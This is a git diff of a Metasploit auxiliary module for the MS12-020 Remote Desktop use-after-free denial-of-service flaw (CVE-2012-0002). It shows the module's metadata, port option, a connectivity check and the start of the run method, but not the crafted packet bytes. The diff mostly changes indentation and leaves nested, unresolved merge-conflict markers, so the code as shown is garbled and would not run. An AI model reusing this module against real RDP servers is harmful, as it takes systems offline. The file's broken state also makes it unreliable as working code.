@@ -9,61 +9,61 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-  include Msf::Auxiliary::Report
-  include Msf::Exploit::Remote::Tcp
-  include Msf::Auxiliary::Dos
+include Msf::Auxiliary::Report
+include Msf::Exploit::Remote::Tcp
+include Msf::Auxiliary::Dos
 
-  def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'MS12-020 Microsoft Remote Desktop Use-After-Free DoS',
-      'Description'    => %q{
-        This module exploits the MS12-020 RDP vulnerability originally discovered and
-        reported by Luigi Auriemma.  The flaw can be found in the way the T.125
-        ConnectMCSPDU packet is handled in the maxChannelIDs field, which will result
-        an invalid pointer being used, therefore causing a denial-of-service condition.
-      },
-      'References'     =>
-        [
-          [ 'CVE', '2012-0002' ],
-          [ 'MSB', 'MS12-020' ],
-          [ 'URL', 'http://www.privatepaste.com/ffe875e04a' ],
-          [ 'URL', 'http://pastie.org/private/4egcqt9nucxnsiksudy5dw' ],
-          [ 'URL', 'http://pastie.org/private/feg8du0e9kfagng4rrg' ],
-          [ 'URL', 'http://stratsec.blogspot.com.au/2012/03/ms12-020-vulnerability-for-breakfast.html' ],
-          [ 'EDB', '18606' ],
-          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/03/21/metasploit-update' ]
-        ],
-      'Author'         =>
-        [
-          'Luigi Auriemma',
-          'Daniel Godas-Lopez',  # Entirely based on Daniel's pastie
-          'Alex Ionescu',
-          'jduck',
-          '#ms12-020' # Freenode IRC
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Mar 16 2012"
-    ))
+def initialize(info = {})
+super(update_info(info,
+'Name'           => 'MS12-020 Microsoft Remote Desktop Use-After-Free DoS',
+'Description'    => %q{
+This module exploits the MS12-020 RDP vulnerability originally discovered and
+reported by Luigi Auriemma.  The flaw can be found in the way the T.125
+ConnectMCSPDU packet is handled in the maxChannelIDs field, which will result
+an invalid pointer being used, therefore causing a denial-of-service condition.
+},
+'References'     =>
+[
+[ 'CVE', '2012-0002' ],
+[ 'MSB', 'MS12-020' ],
+[ 'URL', 'http://www.privatepaste.com/ffe875e04a' ],
+[ 'URL', 'http://pastie.org/private/4egcqt9nucxnsiksudy5dw' ],
+[ 'URL', 'http://pastie.org/private/feg8du0e9kfagng4rrg' ],
+[ 'URL', 'http://stratsec.blogspot.com.au/2012/03/ms12-020-vulnerability-for-breakfast.html' ],
+[ 'EDB', '18606' ],
+[ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/03/21/metasploit-update' ]
+],
+'Author'         =>
+[
+'Luigi Auriemma',
+'Daniel Godas-Lopez',  # Entirely based on Daniel's pastie
+'Alex Ionescu',
+'jduck',
+'#ms12-020' # Freenode IRC
+],
+'License'        => MSF_LICENSE,
+'DisclosureDate' => "Mar 16 2012"
+))
 
-    register_options(
-      [
-        Opt::RPORT(3389)
-      ], self.class)
-  end
+register_options(
+[
+Opt::RPORT(3389)
+], self.class)
+end
 
-  def is_rdp_up
-    begin
-      connect
-      return true
-    rescue Rex::ConnectionRefused
-      return false
-    rescue Rex::ConnectionTimeout
-      return false
-    end
-  end
+def is_rdp_up
+begin
+connect
+return true
+rescue Rex::ConnectionRefused
+return false
+rescue Rex::ConnectionTimeout
+return false
+end
+end
 
-  def run
-    max_channel_ids = "\x02\x01\xff"
+def run
+max_channel_ids = "\x02\x01\xff"
 
 <<<<<<< HEAD
     pkt = ''+
@@ -257,5 +257,8 @@ class Metasploit3 < Msf::Auxiliary
 		  end
 	        end
 	end
+<<<<<<< HEAD
 >>>>>>> Update ms12_020_maxchannelids.rb
+=======
+>>>>>>> f1ab7b51b1c7bef02d1fc094ba591a03303bef10
 end
